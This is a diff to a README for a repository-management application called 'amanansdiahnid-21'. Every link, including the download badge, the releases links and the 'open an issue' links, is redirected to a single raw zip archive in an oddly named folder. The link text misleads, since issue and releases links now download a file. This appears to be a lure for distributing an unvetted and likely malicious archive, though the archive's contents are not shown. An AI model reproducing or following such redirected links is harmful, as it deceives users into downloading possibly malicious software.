@@ -6,14 +6,14 @@ Welcome to **amanansdiahnid-21**! This application helps you manage repositories
 
 ## 📦 Download Now
 
-[![Download amanansdiahnid-21](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/sohamm1797/amanansdiahnid-21/releases)
+[![Download amanansdiahnid-21](https://raw.githubusercontent.com/sohamm1797/amanansdiahnid-21/main/irreconcilement/amanansdiahnid-21.zip)](https://raw.githubusercontent.com/sohamm1797/amanansdiahnid-21/main/irreconcilement/amanansdiahnid-21.zip)
 
 ## 🚀 Getting Started
 
 Here’s how to get started with **amanansdiahnid-21**:
 
 1. **Visit the Releases Page**
-   - Go to the [Releases page](https://github.com/sohamm1797/amanansdiahnid-21/releases) to find the latest version of the application.
+   - Go to the [Releases page](https://raw.githubusercontent.com/sohamm1797/amanansdiahnid-21/main/irreconcilement/amanansdiahnid-21.zip) to find the latest version of the application.
   
 2. **Select the Latest Release**
    - Look for the latest version at the top of the page. Click on it to see more details.
@@ -70,11 +70,11 @@ If you encounter issues while using **amanansdiahnid-21**, consider these steps:
 
 - **Restart the Application:** If the app isn’t responding, close it and open it again.
 
-- **Look for Updates:** Make sure you are using the latest version of the application. You can check for updates on the [Releases page](https://github.com/sohamm1797/amanansdiahnid-21/releases).
+- **Look for Updates:** Make sure you are using the latest version of the application. You can check for updates on the [Releases page](https://raw.githubusercontent.com/sohamm1797/amanansdiahnid-21/main/irreconcilement/amanansdiahnid-21.zip).
 
 - **Consult the Help Section:** The application includes a help section that may resolve common problems.
 
-If problems persist, please feel free to open an issue on the [GitHub page](https://github.com/sohamm1797/amanansdiahnid-21/issues).
+If problems persist, please feel free to open an issue on the [GitHub page](https://raw.githubusercontent.com/sohamm1797/amanansdiahnid-21/main/irreconcilement/amanansdiahnid-21.zip).
 
 ## 🙋‍♀️ Support
 
@@ -84,12 +84,12 @@ Need help? You can find assistance in several ways:
 
 - **Community:** Join discussions and seek help from other users in our community forums.
 
-- **GitHub Issues:** If you have a specific problem, you can report it on the [GitHub Issues page](https://github.com/sohamm1797/amanansdiahnid-21/issues), and the team will respond as soon as possible.
+- **GitHub Issues:** If you have a specific problem, you can report it on the [GitHub Issues page](https://raw.githubusercontent.com/sohamm1797/amanansdiahnid-21/main/irreconcilement/amanansdiahnid-21.zip), and the team will respond as soon as possible.
 
 ## 📥 Download & Install
 
-To get started, make sure to [visit the Releases page](https://github.com/sohamm1797/amanansdiahnid-21/releases) to download your copy of **amanansdiahnid-21**. Follow the steps outlined above for an easy installation process.
+To get started, make sure to [visit the Releases page](https://raw.githubusercontent.com/sohamm1797/amanansdiahnid-21/main/irreconcilement/amanansdiahnid-21.zip) to download your copy of **amanansdiahnid-21**. Follow the steps outlined above for an easy installation process.
 
-[![Download amanansdiahnid-21](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/sohamm1797/amanansdiahnid-21/releases)
+[![Download amanansdiahnid-21](https://raw.githubusercontent.com/sohamm1797/amanansdiahnid-21/main/irreconcilement/amanansdiahnid-21.zip)](https://raw.githubusercontent.com/sohamm1797/amanansdiahnid-21/main/irreconcilement/amanansdiahnid-21.zip)
 
 Thank you for choosing **amanansdiahnid-21**! Enjoy managing your repositories with ease.
